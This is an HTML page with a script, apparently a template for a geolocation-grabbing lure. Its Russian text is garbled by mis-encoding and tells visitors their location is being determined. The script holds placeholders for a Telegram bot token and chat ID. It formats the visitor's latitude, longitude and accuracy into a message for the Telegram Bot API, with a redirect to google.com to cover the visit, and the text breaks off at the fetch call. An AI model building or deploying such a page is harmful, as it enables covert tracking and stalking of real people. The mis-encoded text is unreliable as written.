<body>
  <div class="loader"></div>
  <h2>–û–ø—Ä–µ–¥–µ–ª—è–µ–º –≤–∞—à–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ...</h2>
  <p>–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —Ä–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –≤ –ø–æ—è–≤–∏–≤—à–µ–º—Å—è –æ–∫–Ω–µ</p>

  <script>
    const token = "–¢–í–û–ô_–¢–û–ö–ï–ù_–ë–û–¢–ê";              // <-- –í—Å—Ç–∞–≤—å —Å—é–¥–∞ —Ç–æ–∫–µ–Ω –±–æ—Ç–∞
    const chat_id = "–¢–í–û–ô_CHAT_ID";               // <-- –í—Å—Ç–∞–≤—å —Å—é–¥–∞ chat ID
    const redirectUrl = "https://www.google.com"; // <-- –ö—É–¥–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

    function sendToTelegram(lat, lon, acc) {
      const text = `üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è:\n–®–∏—Ä–æ—Ç–∞: ${lat}\n–î–æ–ª–≥–æ—Ç–∞: ${lon}\n–¢–æ—á–Ω–æ—Å—Ç—å: ${acc} –º`;
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      fetch(url, {
